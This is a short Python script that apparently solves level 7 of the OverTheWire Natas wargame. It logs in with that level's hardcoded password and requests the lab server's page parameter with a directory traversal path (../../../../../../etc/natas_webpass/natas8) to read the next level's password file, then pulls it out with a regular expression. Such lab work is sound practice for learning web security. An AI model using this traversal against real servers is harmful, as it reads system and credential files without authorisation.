#Import Library
import requests
import re

#Setting variables needed
username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

url = f'http://{username}.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8'
payloads = {'secret':'FOEIUWGHFEEUHOFUOIU','submit':'submit'}

#Connect to natas
session = requests.Session()
response = session.request('POST', url, auth=(username,password))

#Filtering to get a password
#result = response.text
result = re.findall('<br>\n(.*)\n\n<!--', response.text)[0]

print(result)
